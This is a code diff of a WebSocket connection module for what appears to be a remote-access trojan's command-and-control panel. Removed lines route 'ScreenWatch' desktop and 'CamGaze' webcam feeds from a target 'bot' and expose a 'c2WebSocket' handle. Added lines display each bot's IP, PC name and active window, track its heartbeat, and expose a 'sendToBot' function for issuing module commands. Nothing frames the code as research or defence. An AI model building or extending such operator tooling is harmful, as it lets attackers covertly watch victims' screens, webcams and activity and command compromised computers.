@@ -1,84 +1,64 @@
- /* frontend/client_control/js/modules/websocket/connection.js */
+/* frontend/client_control/js/modules/websocket/connection.js */
+import { AppState } from '../core/states.js';
 
-import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
+let socket = null, botWatchdog = null;
 
-let ws, heartbeatTimer;
-const targetId = new URLSearchParams(location.search).get('id');
-
-/* ==========================================================================
-   1. ИНТЕРФЕЙС (UI)
-   ========================================================================== */
-
-const updateStatusUI = (status) => {
-    const isOnline = (status === 'online');
-    document.getElementById('status-indicator')?.classList.toggle('online', isOnline);
-
-    const label = document.getElementById('status-text');
-    if (label) label.textContent = isOnline ? 'online' : 'offline';
+const updateUI = (id, val) => {
+    const el = document.getElementById(id);
+    if (el && val) el.textContent = val;
 };
 
-const updateMetaUI = (id, val) => {
-    const map = { 'clientId': 'display-id', 'clientIp': 'display-ip' };
-    const el = document.getElementById(map[id]);
-    if (el && !(id === 'clientIp' && (!val || val === "0.0.0.0"))) {
-        el.textContent = val;
-    }
+const setOnline = (isOnline) => {
+    const dot = document.getElementById('status-indicator');
+    const txt = document.getElementById('status-text');
+    dot?.classList.toggle('online', isOnline);
+    if (txt) txt.textContent = isOnline ? 'online' : 'offline';
 };
 
-/* ==========================================================================
-   2. HEARTBEAT ЛОГИКА
-   ========================================================================== */
+function handleIncomingData(buffer) {
+    try {
+        const view = new DataView(buffer);
+        const dec = new TextDecoder();
 
-const handleHeartbeat = () => {
-    clearTimeout(heartbeatTimer);
-    updateStatusUI('online'); // Включаем online при получении пакета
+        const idLen = view.getUint8(0);
+        const incomingId = dec.decode(new Uint8Array(buffer, 1, idLen));
+        if (incomingId !== AppState.clientId) return;
 
-    heartbeatTimer = setTimeout(() => {
-        updateStatusUI('offline');
-    }, 5000);
-};
+        const modLen = view.getUint8(1 + idLen);
+        const payOff = 6 + idLen + modLen;
+        const payLen = view.getUint32(2 + idLen + modLen, false);
+        const data = JSON.parse(dec.decode(new Uint8Array(buffer, payOff, payLen)));
 
-/* ==========================================================================
-   3. СЕТЕВОЕ СОЕДИНЕНИЕ (WEBSOCKET)
-   ========================================================================== */
+        // 1. Метаданные из БД или активное окно
+        updateUI('bot-ip-display', data.ip);
+        updateUI('bot-pc-display', data.pc_name);
+        updateUI('bot-id-display', data.id);
+        updateUI('bot-window-display', data.activeWindow);
+
+        // 2. Живой Heartbeat
+        if (data.net === "heartbeat") {
+            setOnline(true);
+            clearTimeout(botWatchdog);
+            botWatchdog = setTimeout(() => setOnline(false), 5000);
+        }
+    } catch (e) { console.error("[WS] Parse error", e); }
+}
 
 export function initControlConnection() {
-    const [token, login] = [localStorage.getItem('auth_token'), localStorage.getItem('user_login')];
-    if (!token || !targetId) return;
+    const token = localStorage.getItem('auth_token'), login = localStorage.getItem('user_login');
+    if (!token || !login) return;
 
-    updateStatusUI('offline');
+    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    socket = new WebSocket(`${prot}//${location.host}/ws?token=${token}&login=${login}`);
+    socket.binaryType = 'arraybuffer';
 
-    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-    ws = new WebSocket(`${protocol}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
-    ws.binaryType = 'arraybuffer';
-    window.c2WebSocket = ws;
+    socket.onmessage = (e) => (e.data instanceof ArrayBuffer) && handleIncomingData(e.data);
+    socket.onopen = () => console.log("[WS] Connected");
+    socket.onclose = () => { setOnline(false); clearTimeout(botWatchdog); };
 
-    ws.onopen = () => {
-        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("0", "ping")), 25000);
-        window.sendToBot('DataScribe', 'get_metadata');
-    };
-
-    ws.onmessage = ({ data }) => {
-        const pkg = decodePacket(data);
-        if (!pkg || (pkg.id !== targetId && pkg.id !== "0")) return;
-
-        if (pkg.id === targetId) handleHeartbeat();
-
-        if (pkg.module === 'DataScribe') {
-            try {
-                const meta = JSON.parse(new TextDecoder().decode(pkg.payload));
-                updateMetaUI('clientId', targetId);
-                if (meta.ip) updateMetaUI('clientIp', meta.ip);
-            } catch (e) { console.error("Metadata error:", e); }
-        } else {
-            const routes = { 'ScreenWatch': window.updateDesktopFeed, 'CamGaze': window.updateWebcamFeed };
-            if (routes[pkg.module]) routes[pkg.module](pkg.payload);
+    window.sendToBot = (mod, pay) => {
+        if (socket?.readyState === 1) {
+            import('./sender.js').then(m => socket.send(m.encodePacket(AppState.clientId, mod, pay)));
         }
-    };
-
-    window.sendToBot = (mod, payload = "") => {
-        if (ws?.readyState !== 1) return;
-        const data = typeof payload === 'string' ? new TextEncoder().encode(payload) : payload;
-        ws.send(encodePacket(targetId, mod, data));
     };
 }
